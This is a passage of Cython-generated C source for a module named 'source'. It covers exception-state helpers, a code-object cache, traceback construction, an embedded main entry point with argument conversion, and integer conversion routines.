    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = *type;
    exc_info->exc_value = *value;
    exc_info->exc_traceback = *tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = *type;
    tstate->exc_value = *value;
    tstate->exc_traceback = *tb;
    #endif
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    PyErr_GetExcInfo(&tmp_type, &tmp_value, &tmp_tb);
    PyErr_SetExcInfo(*type, *value, *tb);
    *type = tmp_type;
    *value = tmp_value;
    *tb = tmp_tb;
}
#endif

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
